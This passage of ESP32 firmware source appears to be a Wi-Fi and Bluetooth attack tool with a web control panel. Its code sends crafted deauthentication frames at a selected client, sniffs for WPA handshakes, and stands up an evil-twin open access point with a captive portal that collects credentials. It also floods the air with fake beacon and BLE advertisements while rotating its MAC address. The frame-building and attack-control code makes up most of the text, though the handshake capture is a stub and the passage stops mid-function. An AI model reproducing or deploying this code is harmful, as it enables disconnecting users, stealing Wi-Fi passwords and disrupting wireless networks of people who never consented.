        if (data.status === 'success') {
          showAlert('Client selected successfully!', 'success');
          updateStatus();
        }
      });
    }
    
    // Attack control functions
    function startDeauth() {
      fetch('/deauth?start=true').then(r => r.json()).then(data => {
        if (data.status === 'started') {
          showAlert('Deauth attack started', 'success');
          updateStatus();
        } else {
          showAlert(data.error || 'Failed to start deauth attack', 'danger');
        }
      });
    }
    
    function stopDeauth() {
      fetch('/deauth?start=false').then(r => r.json()).then(data => {
        if (data.status === 'stopped') {
          showAlert('Deauth attack stopped', 'success');
          updateStatus();
        } else {
          showAlert(data.error || 'Failed to stop deauth attack', 'danger');
        }
      });
    }
    
    function startHandshake() {
      fetch('/handshake?start=true').then(r => r.json()).then(data => {
        if (data.status === 'started') {
          showAlert('Handshake capture started', 'success');
          updateStatus();
        } else {
          showAlert(data.error || 'Failed to start handshake capture', 'danger');
        }
      });
    }
    
    function stopHandshake() {
      fetch('/handshake?start=false').then(r => r.json()).then(data => {
        if (data.status === 'stopped') {
          showAlert('Handshake capture stopped', 'success');
          updateStatus();
        } else {
          showAlert(data.error || 'Failed to stop handshake capture', 'danger');
        }
      });
    }
    
    function startEvilTwin() {
      const password = document.getElementById('evilTwinPassword').value;
      fetch('/eviltwin?start=true&password=' + encodeURIComponent(password))
        .then(r => r.json())
        .then(data => {
          if (data.status === 'started') {
            showAlert('Evil Twin started', 'success');
            updateStatus();
          } else {
            showAlert(data.error || 'Failed to start Evil Twin', 'danger');
          }
        });
    }

    
    function stopEvilTwin() {
      fetch('/eviltwin?start=false').then(r => r.json()).then(data => {
        if (data.status === 'stopped') {
          showAlert('Evil Twin stopped', 'success');
          updateStatus();
        } else {
          showAlert(data.error|| 'Failed to stop Evil Twin', 'danger');
        }
      });
    }

    function addCapturedCredential(cred) {
    const credsDiv = document.getElementById('capturedCredsList');
    if (credsDiv.innerHTML.includes('No credentials captured yet.') || credsDiv.innerHTML.includes('Waiting for credentials...')) {
      credsDiv.innerHTML = '';
    }
    const p = document.createElement('p');
    p.textContent = cred;
    credsDiv.appendChild(p);
  }

    
    function startBeaconFlood() {
      fetch('/beaconflood?start=true').then(r => r.json()).then(data => {
        if (data.status === 'started') {
          showAlert('Beacon flood started', 'success');
          updateStatus();
        } else {
          showAlert(data.error || 'Failed to start beacon flood', 'danger');
        }
      });
    }
    
    function stopBeaconFlood() {
      fetch('/beaconflood?start=false').then(r => r.json()).then(data => {
        if (data.status === 'stopped') {
          showAlert('Beacon flood stopped', 'success');
          updateStatus();
        } else {
          showAlert(data.error || 'Failed to stop beacon flood', 'danger');
        }
      });
    }
    
    function setFloodInterval() {
      const interval = document.getElementById('floodInterval').value;
      fetch('/setFloodInterval?interval=' + interval).then(r => r.json()).then(data => {
        if (data.status === 'interval_set') {
          showAlert('Flood interval set to ' + interval + 'ms', 'success');
        } else {
          showAlert(data.error || 'Failed to set flood interval', 'danger');
        }
      });
    }
    
    function setFloodChannel() {
      const channel = document.getElementById('floodChannel').value;
      if (channel >= 1 && channel <= 14) {
        fetch('/setChannel?channel=' + channel).then(r => r.json()).then(data => {
          if (data.status === 'channel_set') {
            showAlert('Channel set to ' + channel, 'success');
          } else {
            showAlert(data.error || 'Failed to set channel', 'danger');
          }
        });
      } else {
        showAlert('Channel must be between 1 and 14', 'danger');
      }
    }
    
    function startBLEFlood() {
      fetch('/bleflood?start=true').then(r => r.json()).then(data => {
        if (data.status === 'started') {
          showAlert('BLE flood started', 'success');
          updateStatus();
        } else {
          showAlert(data.error || 'Failed to start BLE flood', 'danger');
        }
      });
    }
    
    function stopBLEFlood() {
      fetch('/bleflood?start=false').then(r => r.json()).then(data => {
        if (data.status === 'stopped') {
          showAlert('BLE flood stopped', 'success');
          updateStatus();
        } else {
          showAlert(data.error || 'Failed to stop BLE flood', 'danger');
        }
      });
    }
    
    function scanBLEDevices() {
      showAlert('BLE device scanning not yet implemented', 'warning');
    }
    
    // SSID Management functions
    function addSSID() {
      const ssid = document.getElementById('ssidInput').value.trim();
      if (ssid) {
        fetch('/addSSID', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: 'ssid=' + encodeURIComponent(ssid)
        }).then(r => r.json()).then(data => {
          if (data.status === 'ssid_added') {
            showAlert('SSID added successfully!', 'success');
            document.getElementById('ssidInput').value = '';
            updateStatus();
          } else {
            showAlert(data.error || 'Error adding SSID', 'danger');
          }
        });
      } else {
        showAlert('Please enter an SSID', 'warning');
      }
    }
    
    function addRandomSSID() {
      const randomSSID = 'ESP32-' + Math.floor(Math.random() * 10000);
      document.getElementById('ssidInput').value = randomSSID;
      addSSID();
    }
    
    function cloneSpecificSSID() {
      const ssid = document.getElementById('cloneSSIDInput').value.trim();
      if (ssid) {
        cloneNetworkSSID(ssid);
      } else {
        showAlert('Please enter an SSID to clone', 'warning');
      }
    }
    
    function removeSSID(ssid) {
      fetch('/removeSSID', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'ssid=' + ssid
      }).then(r => r.json()).then(data => {
        if (data.status === 'ssid_removed') {
          showAlert('SSID removed successfully!', 'success');
          updateStatus();
        } else {
          showAlert(data.error || 'Error removing SSID', 'danger');
        }
      });
    }
    
    function clearSSIDs() {
      if (confirm('Are you sure you want to clear all SSIDs?')) {
        fetch('/clearSSIDs').then(r => r.json()).then(data => {
          if (data.status === 'ssids_cleared') {
            showAlert('All SSIDs cleared!', 'success');
            updateStatus();
          } else {
            showAlert(data.error || 'Error clearing SSIDs', 'danger');
          }
        });
      }
    }
    
    // Handshake functions
    function listHandshakes() {
      fetch('/listHandshakes').then(r => r.json()).then(data => {
        const table = document.getElementById('handshakesList');
        
        if (data.handshakes && data.handshakes.length > 0) {
          table.innerHTML = '';
          
          data.handshakes.forEach((handshake, index) => {
            const row = document.createElement('tr');
            
            row.innerHTML = `
              <td>${handshake.ssid || '<span class="text-muted">Unknown</span>'}</td>
              <td>${handshake.bssid}</td>
              <td>${new Date(handshake.timestamp).toLocaleString()}</td>
              <td>
                <button class="btn btn-sm btn-primary" onclick="downloadHandshake(${index})">
                  <i class="fas fa-download"></i> Download
                </button>
                <button class="btn btn-sm btn-danger" onclick="deleteHandshake(${index})">
                  <i class="fas fa-trash"></i> Delete
                </button>
              </td>
            `;
            
            table.appendChild(row);
          });
        } else {
          table.innerHTML = `
            <tr>
              <td colspan="4" style="text-align: center;" class="text-muted">
                No handshakes captured yet
              </td>
            </tr>
          `;
        }
      });
    }
    
    function downloadHandshake(index) {
      window.location.href = '/downloadHandshake?index=' + index;
    }
    
    function deleteHandshake(index) {
      if (confirm('Are you sure you want to delete this handshake?')) {
        fetch('/deleteHandshake?index=' + index).then(r => r.json()).then(data => {
          if (data.status === 'deleted') {
            showAlert('Handshake deleted', 'success');
            listHandshakes();
          } else {
            showAlert(data.error || 'Failed to delete handshake', 'danger');
          }
        });
      }
    }
    
    // Utility functions
    function showLoader(elementId, message) {
      const element = document.getElementById(elementId);
      if (element) {
        element.innerHTML = `
          <tr>
            <td colspan="${element.querySelector('th') ? element.querySelectorAll('th').length : 4}" style="text-align: center;">
              <i class="fas fa-spinner fa-spin"></i> ${message}
            </td>
          </tr>
        `;
      }
    }
    
    function showAlert(message, type) {
      const alert = document.createElement('div');
      alert.className = `alert alert-${type}`;
      alert.innerHTML = `<i class="fas fa-${getAlertIcon(type)}"></i> ${message}`;
      
      // Prepend to body
      document.body.insertBefore(alert, document.body.firstChild);
      
      // Auto remove after 5 seconds
      setTimeout(() => {
        alert.remove();
      }, 5000);
    }
    
    function getAlertIcon(type) {
      switch(type) {
        case 'success': return 'check-circle';
        case 'danger': return 'times-circle';
        case 'warning': return 'exclamation-triangle';
        case 'info': return 'info-circle';
        default: return 'info-circle';
      }
    }
    
    // Initialize
    document.addEventListener('DOMContentLoaded', function() {
      updateStatus();
      listHandshakes();
      
      // Set up periodic status updates
      setInterval(updateStatus, 10000);
    });
  </script>
</body>
</html>
)rawliteral";

// ===== WIFI SNIFFER ===== //
typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t receiver[6];
  uint8_t transmitter[6];
  uint8_t bssid[6];
  uint16_t sequence_ctrl;
  uint8_t payload[];
} wifi_ieee80211_mac_hdr_t;

typedef struct {
  wifi_ieee80211_mac_hdr_t hdr;
  uint8_t payload[0];
} wifi_ieee80211_packet_t;

// ===== SETUP ===== //
void setup() {
  Serial.begin(115200);

  // Step 1: Connect to WiFi (OTA only)
  connectToWiFi();      // WiFi STA mode for OTA
  setupOTA();           // Start OTA service

  // Step 2: Other setup code
  EEPROM.begin(EEPROM_SIZE);

  // Step 3: SPIFFS Init
  if (!SPIFFS.begin(true)) {
    Serial.println("[!] Failed to mount SPIFFS");
    return;
  }

  // Step 4: BLE Init
  NimBLEDevice::init("");
  NimBLEDevice::setPower((esp_power_level_t)kTxPower);

  for (uint8_t i = 0; i < kNumAdvertisers; ++i) {
    advertisers[i] = NimBLEDevice::createAdvertising();
    advertisers[i]->setAdvertisingType(BLE_HCI_ADV_TYPE_ADV_NONCONN_IND);
    advertisers[i]->setMinInterval(0x0020);
    advertisers[i]->setMaxInterval(0x0020);

    esp_timer_create_args_t timerArgs = {
      .callback = flood_callback,
      .arg = reinterpret_cast<void*>(i),
      .dispatch_method = ESP_TIMER_TASK,
      .name = "flood_timer"
    };
    esp_timer_create(&timerArgs, &timers[i]);
    esp_timer_start_periodic(timers[i], kFloodIntervalUs);
  }

  rotateMacAddress();
  lastMacRotate = millis();

  // Step 5: Load config
  loadSettings();
  loadHandshakesList();

  // Step 6: WiFi Setup
  setupAPMode();  // Web interface AP mode
  setupSTAMode(); // For scanning/attacks

  // Step 7: Web Server Routes
  webServer.on("/", HTTP_GET, handleRoot);
  webServer.on("/login", HTTP_POST, handleLogin);
  webServer.on("/status", handleStatus);
  webServer.on("/scanNetworks", handleScanNetworks);
  webServer.on("/getNetworks", handleGetNetworks);
  webServer.on("/selectNetwork", handleSelectNetwork);
  webServer.on("/scanClients", handleScanClients);
  webServer.on("/selectClient", handleSelectClient);
  webServer.on("/deauth", handleDeauth);
  webServer.on("/handshake", handleHandshake);
  webServer.on("/eviltwin", handleEvilTwin);
  webServer.on("/beaconflood", handleBeaconFlood);
  webServer.on("/bleflood", [](AsyncWebServerRequest *request) {
    if (request->arg("start") == "true") {
      floodingEnabled = true;
      request->send(200, "application/json", "{\"status\":\"started\"}");
    } else {
      floodingEnabled = false;
      request->send(200, "application/json", "{\"status\":\"stopped\"}");
    }
  });
  webServer.on("/scanBLEDevices", [](AsyncWebServerRequest *request) {
    scanBLEDevices();
    request->send(200, "application/json", "{\"status\":\"scan_started\"}");
  });
  webServer.on("/setFloodInterval", HTTP_POST, handleSetFloodInterval);
  webServer.on("/setFloodChannel", HTTP_POST, handleSetFloodChannel);
  webServer.on("/addSSID", HTTP_POST, handleAddSSID);
  webServer.on("/removeSSID", HTTP_POST, handleRemoveSSID);
  webServer.on("/clearSSIDs", HTTP_POST, handleClearSSIDs);
  webServer.on("/cloneSpecificSSID", HTTP_POST, handleCloneSpecificSSID);
  webServer.on("/downloadHandshake", handleDownloadHandshake);
  webServer.on("/listHandshakes", handleListHandshakes);
  webServer.on("/settings", handleSettings);
  webServer.on("/saveSettings", handleSaveSettings);
  webServer.on("/reboot", handleReboot);
  webServer.onNotFound([]() {
    webServer.send(404, "text/plain", "404: Not Found");
  });

  webServer.begin();
  asyncServer.begin();
  Serial.println("[+] Web servers started");

  // Step 8: Background Tasks
  xTaskCreatePinnedToCore(
    backgroundTasks,
    "backgroundTasks",
    10000,
    NULL,
    1,
    &backgroundTaskHandle,
    0
  );
}
// ===== MAIN LOOP ===== //
void loop() {

  ArduinoOTA.handle(); 

  dnsServer.processNextRequest();
  webServer.handleClient();

  // Button Control
  static bool lastButtonState = HIGH;
  bool currentButtonState = digitalRead(kButtonPin);
  if (lastButtonState == HIGH && currentButtonState == LOW) {
    floodingEnabled = !floodingEnabled;
    Serial.println(floodingEnabled ? "BLE Flooding ENABLED" : "BLE Flooding DISABLED");
  }
  lastButtonState = currentButtonState;

  // MAC Rotation
  if (millis() - lastMacRotate >= kMacRotationInterval) {
    rotateMacAddress();
    lastMacRotate = millis();
  }

  esp_task_wdt_reset();
  delay(10);
}

// ===== BACKGROUND TASKS ===== //
void backgroundTasks(void *pvParameters) {
  unsigned long lastDeauth = 0;
  unsigned long lastScan = 0;
  
  for (;;) {
    unsigned long currentMillis = millis();

    // Handle Deauthentication Attack
    if (session.deauthingActive && currentMillis - lastDeauth >= DEAUTH_INTERVAL) {
      sendDeauthPacket();
      lastDeauth = currentMillis;
    }

    // Handle periodic network scanning
    if (currentMillis - lastScan >= SCAN_INTERVAL && !session.scanningActive) {
      scanNetworksAsync();
      lastScan = currentMillis;
    }

    // Handle WPA Handshake Capture timeout
    if (session.handshakeCaptureActive && 
        currentMillis - session.handshakeStartTime >= HANDSHAKE_TIMEOUT) {
      session.handshakeCaptureActive = false;
      stopWiFiSniffer();
      Serial.println("[!] Handshake capture timed out");
    }

    delay(100);
  }
}

// ===== WEB HANDLERS ===== //
void handleRoot() {
  if (!isAuthenticated()) {
    webServer.send(200, "text/html", loginHTML);
    return;
  }
  webServer.send(200, "text/html", dashboardHTML);
}

void handleLogin() {
  String user = webServer.arg("user");
  String pass = webServer.arg("pass");
  
  if (user == WEB_USER && pass == WEB_PASS) {
    session.authenticated = true;
    webServer.sendHeader("Location", "/");
    webServer.send(303);
  } else {
    webServer.send(401, "text/plain", "Invalid credentials");
  }
}

void handleStatus() {
  if (!isAuthenticated()) {
    webServer.send(401, "text/plain", "Unauthorized");
    return;
  }
  
  String json = "{";
  json += "\"selectedNetwork\":{\"ssid\":\"" + selectedNetwork.ssid + "\",\"bssid\":\"" + macToString(selectedNetwork.bssid) + "\"},";
  json += "\"selectedClient\":{\"mac\":\"" + selectedClient.mac + "\"},";
  json += "\"deauthingActive\":" + String(session.deauthingActive ? "true" : "false") + ",";
  json += "\"handshakeCaptureActive\":" + String(session.handshakeCaptureActive ? "true" : "false") + ",";
  json += "\"evilTwinActive\":" + String(session.evilTwinActive ? "true" : "false") + ",";
  json += "\"beaconFloodActive\":" + String(session.beaconFloodActive ? "true" : "false") + ",";
  json += "\"bleFloodActive\":" + String(floodingEnabled ? "true" : "false") + ",";
  json += "\"floodInterval\":" + String(session.floodInterval) + ",";
  json += "\"currentChannel\":" + String(session.currentChannel) + ",";
  json += "\"ssids\":[";
  for (size_t i = 0; i < ssidList.size(); i++) {
    if (i > 0) json += ",";
    json += "\"" + ssidList[i] + "\"";
  }
  json += "]";
  json += "}";
  
  webServer.send(200, "application/json", json);
}

void handleScanNetworks() {
  if (!isAuthenticated()) {
    sendJSONResponse("error", "unauthorized");
    return;
  }
  scanNetworksAsync();
  sendJSONResponse("scan_started");
}

void handleGetNetworks() {
  if (!isAuthenticated()) {
    sendJSONResponse("error", "unauthorized");
    return;
  }
  
  String json = "{\"networks\":[";
  for (size_t i = 0; i < networks.size(); i++) {
    if (i > 0) json += ",";
    json += "{";
    json += "\"ssid\":\"" + networks[i].ssid + "\",";
    json += "\"bssid\":\"" + macToString(networks[i].bssid) + "\",";
    json += "\"ch\":" + String(networks[i].ch) + ",";
    json += "\"rssi\":" + String(networks[i].rssi) + ",";
    json += "\"encrypted\":" + String(networks[i].encrypted ? "true" : "false");
    json += "}";
  }
  json += "]}";
  
  webServer.send(200, "application/json", json);
}

void handleSelectNetwork() {
  if (!isAuthenticated()) {
    sendJSONResponse("error", "unauthorized");
    return;
  }
  
  int index = webServer.arg("index").toInt();
  if (index >= 0 && index < networks.size()) {
    selectedNetwork = networks[index];
    setWiFiChannel(selectedNetwork.ch);
    Serial.printf("[+] Selected network: %s (BSSID: %s, Channel: %d)\n", 
      selectedNetwork.ssid.c_str(), 
      macToString(selectedNetwork.bssid).c_str(), 
      selectedNetwork.ch);
    sendJSONResponse("success");
  } else {
    sendJSONResponse("error", "invalid_index");
  }
}

void handleScanClients() {
  if (!isAuthenticated()) {
    sendJSONResponse("error", "unauthorized");
    return;
  }
  
  if (selectedNetwork.ssid == "") {
    sendJSONResponse("error", "no_network_selected");
    return;
  }
  
  scanClientsAsync();
  sendJSONResponse("scan_started");
}

void handleSelectClient() {
  if (!isAuthenticated()) {
    sendJSONResponse("error", "unauthorized");
    return;
  }
  
  int index = webServer.arg("index").toInt();
  if (index >= 0 && index < clients.size()) {
    selectedClient = clients[index];
    Serial.printf("[+] Selected client: %s\n", selectedClient.mac.c_str());
    sendJSONResponse("success");
  } else {
    sendJSONResponse("error", "invalid_index");
  }
}

void handleDeauth() {
  if (!isAuthenticated()) {
    sendJSONResponse("error", "unauthorized");
    return;
  }
  
  if (webServer.arg("start") == "true") {
    if (selectedNetwork.ssid == "" || selectedClient.mac == "") {
      sendJSONResponse("error", "no_target_selected");
      return;
    }
    session.deauthingActive = true;
    Serial.println("[+] Deauth attack started");
    sendJSONResponse("started");
  } else {
    session.deauthingActive = false;
    Serial.println("[+] Deauth attack stopped");
    sendJSONResponse("stopped");
  }
}

void handleHandshake() {
  if (!isAuthenticated()) {
    sendJSONResponse("error", "unauthorized");
    return;
  }
  
  if (webServer.arg("start") == "true") {
    if (selectedNetwork.ssid == "") {
      sendJSONResponse("error", "no_network_selected");
      return;
    }
    session.handshakeCaptureActive = true;
    session.handshakeStartTime = millis();
    startWiFiSniffer();
    Serial.println("[+] Handshake capture started");
    sendJSONResponse("started");
  } else {
    session.handshakeCaptureActive = false;
    stopWiFiSniffer();
    Serial.println("[+] Handshake capture stopped");
    sendJSONResponse("stopped");
  }
}
void handleEvilTwin() {
  if (!isAuthenticated()) {
    sendJSONResponse("error", "unauthorized");
    return;
  }

  if (webServer.arg("start") == "true") {
    if (selectedNetwork.ssid == "") {
      sendJSONResponse("error", "no_network_selected");
      return;
    }
    startEvilTwin("");  // Start with no password
    sendJSONResponse("started");
  } else {
    stopEvilTwin();
    sendJSONResponse("stopped");
  }
}


void handleBeaconFlood() {
  if (!isAuthenticated()) {
    sendJSONResponse("error", "unauthorized");
    return;
  }
  
  if (webServer.arg("start") == "true") {
    if (ssidList.size() == 0) {
      sendJSONResponse("error", "no_ssids_configured");
      return;
    }
    startBeaconFlood();
    sendJSONResponse("started");
  } else {
    stopBeaconFlood();
    sendJSONResponse("stopped");
  }
}

void handleSetFloodInterval() {
  if (!isAuthenticated()) {
    sendJSONResponse("error", "unauthorized");
    return;
  }
  
  uint16_t newInterval = webServer.arg("interval").toInt();
  if (newInterval >= MIN_FLOOD_INTERVAL && newInterval <= MAX_FLOOD_INTERVAL) {
    session.floodInterval = newInterval;
    sendJSONResponse("interval_updated");
  } else {
    sendJSONResponse("error", 
      String("interval_must_be_between_") + MIN_FLOOD_INTERVAL + "_and_" + MAX_FLOOD_INTERVAL);
  }
}

void handleSetFloodChannel() {
  if (!isAuthenticated()) {
    sendJSONResponse("error", "unauthorized");
    return;
  }
  
  uint8_t newChannel = webServer.arg("channel").toInt();
  if (newChannel >= 1 && newChannel <= 14) {
    setWiFiChannel(newChannel);
    session.currentChannel = newChannel;
    sendJSONResponse("channel_updated");
  } else {
    sendJSONResponse("error", "channel_must_be_between_1_and_14");
  }
}

void handleAddSSID() {
  if (!isAuthenticated()) {
    sendJSONResponse("error", "unauthorized");
    return;
  }
  
  String ssid = webServer.arg("ssid");
  ssid.trim();

  if (ssid.length() == 0) {
    sendJSONResponse("error", "ssid_cannot_be_empty");
    return;
  }

  if (ssid.length() > MAX_SSID_LENGTH) {
    sendJSONResponse("error", 
      String("ssid_too_long_max_") + MAX_SSID_LENGTH + "_characters");
    return;
  }

  if (ssidList.size() >= MAX_SSID_LIST) {
    sendJSONResponse("error", 
      String("ssid_list_full_max_") + MAX_SSID_LIST + "_ssids");
    return;
  }

  ssidList.push_back(ssid);
  sendJSONResponse("ssid_added");
}

void handleRemoveSSID() {
  if (!isAuthenticated()) {
    sendJSONResponse("error", "unauthorized");
    return;
  }
  
  String ssid = webServer.arg("ssid");
  for (size_t i = 0; i < ssidList.size(); i++) {
    if (ssidList[i] == ssid) {
      ssidList.erase(ssidList.begin() + i);
      sendJSONResponse("ssid_removed");
      return;
    }
  }
  sendJSONResponse("error", "ssid_not_found");
}

void handleClearSSIDs() {
  if (!isAuthenticated()) {
    sendJSONResponse("error", "unauthorized");
    return;
  }
  
  ssidList.clear();
  sendJSONResponse("ssid_list_cleared");
}

void handleDownloadHandshake() {
  if (!isAuthenticated()) {
    webServer.send(401, "text/plain", "Unauthorized");
    return;
  }
  
  String filename = webServer.arg("file");
  if (filename == "" || !filename.endsWith(".pcap")) {
    webServer.send(400, "text/plain", "Invalid filename");
    return;
  }
  
  if (!SPIFFS.exists(filename)) {
    webServer.send(404, "text/plain", "File not found");
    return;
  }
  
  File file = SPIFFS.open(filename, FILE_READ);
  webServer.sendHeader("Content-Type", "application/octet-stream");
  webServer.sendHeader("Content-Disposition", "attachment; filename=" + filename.substring(filename.lastIndexOf('/') + 1));
  webServer.streamFile(file, "application/octet-stream");
  file.close();
}

void handleListHandshakes() {
  if (!isAuthenticated()) {
    sendJSONResponse("error", "unauthorized");
    return;
  }
  
  String json = "{\"handshakes\":[";
  for (size_t i = 0; i < savedHandshakes.size(); i++) {
    if (i > 0) json += ",";
    json += "{";
    json += "\"ssid\":\"" + savedHandshakes[i].ssid + "\",";
    json += "\"bssid\":\"" + savedHandshakes[i].bssid + "\",";
    json += "\"timestamp\":\"" + savedHandshakes[i].timestamp + "\",";
    json += "\"filename\":\"" + savedHandshakes[i].filename + "\"";
    json += "}";
  }
  json += "]}";
  
  webServer.send(200, "application/json", json);
}

// ===== CORE FUNCTIONS ===== //
void sendDeauthPacket() {
  if (selectedNetwork.ssid == "" || selectedClient.mac == "") {
    return;
  }

  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0x00, 0x00, 0x07, 0x00
  };

  // Convert MAC strings to byte arrays
  uint8_t targetMac[6];
  uint8_t bssid[6];
  sscanf(selectedClient.mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
    &targetMac[0], &targetMac[1], &targetMac[2], 
    &targetMac[3], &targetMac[4], &targetMac[5]);
  sscanf(macToString(selectedNetwork.bssid).c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
    &bssid[0], &bssid[1], &bssid[2], 
    &bssid[3], &bssid[4], &bssid[5]);

  memcpy(&deauthPacket[4], targetMac, 6);  // Destination MAC (client)
  memcpy(&deauthPacket[10], bssid, 6);    // Source MAC (AP)
  memcpy(&deauthPacket[16], bssid, 6);    // BSSID (AP)

  setWiFiChannel(selectedNetwork.ch);
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
  Serial.printf("[+] Deauth packet sent to %s from %s\n", 
    selectedClient.mac.c_str(), 
    macToString(selectedNetwork.bssid).c_str());
}

void startWiFiSniffer() {
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);
}

void stopWiFiSniffer() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
}

void wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!session.handshakeCaptureActive) return;
  
  const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t*)pkt->payload;
  const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;

  // Check if packet is from our target network
  String packetBSSID = macToString(hdr->bssid);
  String targetBSSID = macToString(selectedNetwork.bssid);
  
  if (packetBSSID.equalsIgnoreCase(targetBSSID)) {
    // Check for EAPOL packets (part of WPA handshake)
    if (pkt->payload[0] == 0x88 && pkt->payload[1] == 0x8E) {
      Serial.println("[+] Detected EAPOL packet (potential handshake)");
      // In a real implementation, we would:
      // 1. Capture all 4 handshake messages
      // 2. Validate the complete handshake
      // 3. Save to file
      uint8_t dummyHandshake[256]; // Placeholder
      saveHandshakeToFile(selectedNetwork.ssid, targetBSSID, dummyHandshake, sizeof(dummyHandshake));
      session.handshakeCaptureActive = false;
      stopWiFiSniffer();
    }
  }
}

void startEvilTwin(const String& unused) {
  if (session.evilTwinActive) return;

  WiFi.softAPdisconnect(true);

  // Open access point (no password)
  WiFi.softAP(selectedNetwork.ssid.c_str());

  session.evilTwinActive = true;

  setupCaptivePortal();

  Serial.printf("[+] Evil Twin started for SSID: %s (OPEN)\n", selectedNetwork.ssid.c_str());
}

void stopEvilTwin() {
  if (!session.evilTwinActive) return;
  
  WiFi.softAPdisconnect(true);
  setupAPMode();
  session.evilTwinActive = false;
  Serial.println("[+] Evil Twin stopped");
}

void startBeaconFlood() {
  if (session.beaconFloodActive) return;
  
  session.beaconFloodActive = true;
  xTaskCreatePinnedToCore(
    beaconFloodTask,
    "BeaconFloodTask",
    4096,
    NULL,
    1,
    &floodTaskHandle,
    0
  );
  Serial.println("[+] Beacon flood started");
}

void stopBeaconFlood() {
  if (!session.beaconFloodActive) return;
  
  session.beaconFloodActive = false;
  if (floodTaskHandle != NULL) {
    vTaskDelete(floodTaskHandle);
    floodTaskHandle = NULL;
  }
  Serial.println("[+] Beacon flood stopped");
}

void beaconFloodTask(void *parameter) {
  uint32_t packetCount = 0;
  
  while (session.beaconFloodActive) {
    for (const String &ssid : ssidList) {
      if (!session.beaconFloodActive) break;
      
      sendBeacon(ssid, session.currentChannel);
      packetCount++;
      
      // Only print every 10 packets to avoid spamming serial
      if (packetCount % 10 == 0) {
        Serial.printf("[+] Sent %u beacons (Last SSID: %s)\n", packetCount, ssid.c_str());
      }
      
      delay(session.floodInterval);
    }
  }
  
  Serial.printf("[+] Beacon flood task ended. Total packets sent: %u\n", packetCount);
  vTaskDelete(NULL);
}

void sendBeacon(const String &ssid, uint8_t channel) {
  // Set the current channel before sending
  setWiFiChannel(channel);

  uint8_t mac[6];
  generateRandomMac(mac);

  // Beacon frame template
  uint8_t beaconPacket[128] = {
    // IEEE 802.11 frame header
    0x80, 0x00,                         // Frame Control (Beacon frame)
    0x00, 0x00,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination address (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (will be filled in)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (will be filled in)
    0x00, 0x00,                         // Sequence number (will be randomized)
    
    // IEEE 802.11 wireless management frame
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00,                                     // Beacon interval (100ms)
    0x21, 0x04,                                     // Capability info (ESS, privacy)
    
    // SSID parameter set
    0x00,                                           // SSID element ID
    0x00,                                           // SSID length (will be filled in)
    // SSID (will be filled in)
  };

  // Fill in variable fields
  memcpy(&beaconPacket[10], mac, 6);  // Source MAC
  memcpy(&beaconPacket[16], mac, 6);  // BSSID
  beaconPacket[22] = random(256);     // Sequence number (part 1)
  beaconPacket[23] = random(256);     // Sequence number (part 2)
  
  // Set SSID length and content
  uint8_t ssidLen = ssid.length();
  beaconPacket[37] = ssidLen;
  memcpy(&beaconPacket[38], ssid.c_str(), ssidLen);
  
  // Calculate total packet length
  uint16_t packetLength = 38 + ssidLen;
  
  // Add supported rates (typical for beacon frames)
  beaconPacket[packetLength++] = 0x01; // Supported rates element ID
  beaconPacket[packetLength++] = 0x08; // Length
  beaconPacket[packetLength++] = 0x82; // 1(B)
  beaconPacket[packetLength++] = 0x84; // 2(B)
  beaconPacket[packetLength++] = 0x8b; // 5.5(B)
  beaconPacket[packetLength++] = 0x96; // 11(B)
  beaconPacket[packetLength++] = 0x24; // 18
  beaconPacket[packetLength++] = 0x30; // 24
  beaconPacket[packetLength++] = 0x48; // 36
  beaconPacket[packetLength++] = 0x6c; // 54
  
  // Send the packet
  esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, packetLength, false);
}

// ===== HELPER FUNCTIONS ===== //
String macToString(const uint8_t* mac) {
  char buf[20];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X", 
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

void scanNetworksAsync() {
  if (session.scanningActive) return;
  
  session.scanningActive = true;
  WiFi.scanNetworks(true, true, false, 500);
  
  // Check scan status in the background
  xTaskCreatePinnedToCore(
    [](void *pvParameters) {
      int n = WiFi.scanComplete();
      while (n == WIFI_SCAN_RUNNING) {
        delay(500);
        n = WiFi.scanComplete();
      }
      
      networks.clear();
      if (n > 0) {
        for (int i = 0; i < n; i++) {
          Network net;
          net.ssid = WiFi.SSID(i);
          memcpy(net.bssid, WiFi.BSSID(i), 6);
          net.ch = WiFi.channel(i);
          net.rssi = WiFi.RSSI(i);
          net.encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
          networks.push_back(net);
        }
      }
      session.scanningActive = false;
      Serial.printf("[+] Network scan completed. Found %d networks\n", n);
      vTaskDelete(NULL);
    },
    "scanTask",
    4096,
    NULL,
    1,
    NULL,
    0
  );
}

void scanClientsAsync() {
  if (session.clientScanActive || selectedNetwork.ssid == "") return;
  
  session.clientScanActive = true;
  setWiFiChannel(selectedNetwork.ch);
  
